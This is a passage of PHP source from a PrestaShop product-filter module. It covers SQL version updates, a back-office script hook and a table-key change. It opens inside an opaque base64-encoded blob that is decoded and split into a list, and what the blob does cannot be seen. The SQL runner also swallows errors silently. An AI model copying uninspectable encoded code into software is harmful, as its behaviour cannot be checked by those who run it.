93u56CfunBMzfSTk8QdHdLyNyZxL8DTnV6v4F6Ieb/OePQge1r1uXIW97SuyiN6xRl559W3Q3T/thlX0rb5hhddoNUJ/MnrvgFHtCT/xPmN8D/VrimSlw036r76++hHh69oVTul3YSH11GGGNXQ4e5rPgOxC2TP7a7tX92JBP2zMbL9jQPvW+R5mraOtwSF16jU2l2uGNQP6EKeKom5ryie0hTxLTW7GgQOKcBar+wD0Eco0DgX/uLPMy+FzmRNACCIGb/599///3v/wM=")));   
            
        return explode('|', $output);            
	}
    
    public function updateVersion(){
        if (Module::isInstalled('filterproductspro') && Configuration::get('FPP_VERSION') != $this->version){
            $old_version = Configuration::get('FPP_VERSION');

            if (empty($old_version)){
                Configuration::updateValue('FPP_VERSION', '1.6.1');
            }
            
            $old_version = Configuration::get('FPP_VERSION');
            
            if (!empty($old_version)){
                if (version_compare($old_version, $this->version) < 0){
                    $list = array();
                    
                    $fd = opendir(_PS_MODULE_DIR_ . $this->name. '/sql');
                	while ($file = readdir($fd))
                	{
                		if (substr($file, -3, 3) == 'sql' && version_compare($old_version, substr($file, 0, -4)) < 0)
                		{
                			$list[] = $file;
                		}        
                	}
                    
                	usort($list, 'version_compare');
                		                    
                    foreach($list AS $file){         
                        $this->executeSQLUpdate($file);
                    }
                    
                    Configuration::updateValue('FPP_VERSION', $this->version);                                        
                }        
            }
        }
        
        return true;
    }
    
    private function executeSQLUpdate($file){
        $result = true;
        
        if (!file_exists(_PS_MODULE_DIR_ . $this->name . '/sql/' . $file))
            return (false);
        else if (!$sql = file_get_contents(_PS_MODULE_DIR_ . $this->name . '/sql/' . $file))
            return (false);
    
        $sql = str_replace('PREFIX_', _DB_PREFIX_, $sql);
        $sql = preg_split("/;\s*[\r\n]+/", $sql);
        
        try{
            foreach ($sql as $query)
                if (!Db::getInstance()->Execute(trim($query)))
                    $result = false;
        }catch(Exception $e){} 
        
        return $result;
    }

	//i add
	public function hookDisplayBackofficeTop(){
		//js from hook header or any other addJs array is loaded before controllers js, therefore adding it there to force overriding of default admin-products.js
		$controller = Tools::getValue('controller', false);
		$id_product = Tools::getValue('id_product', 0);
		if (strtolower($controller) == 'adminproducts' 
			and (int)$id_product > 0
			and (
				Tools::getIsset('addproduct')
				or
				Tools::getIsset('updateproduct')
				))
			return '
				<!-- Filter products pro hookDisplayBackofficeTop -->
				<script src="'.__PS_BASE_URI__.'modules/filterproductspro/override/js/admin-products.js'.'" type="text/javascript"></script>
				<script src="'.__PS_BASE_URI__.'modules/filterproductspro/override/js/jquery.autocomplete.js'.'" type="text/javascript"></script>
				<!-- /Filter products pro hookDisplayBackofficeTop -->
				';
	}
	public function updateFeatureProductTable(){
		if (!Db::getInstance()->Execute('
			ALTER TABLE `'._DB_PREFIX_.'feature_product` 
			DROP PRIMARY KEY, 
			ADD PRIMARY KEY (`id_feature`, `id_product`, `id_feature_value`)
				;'))
			return false;
		return true;
	}
	//<<
}
?>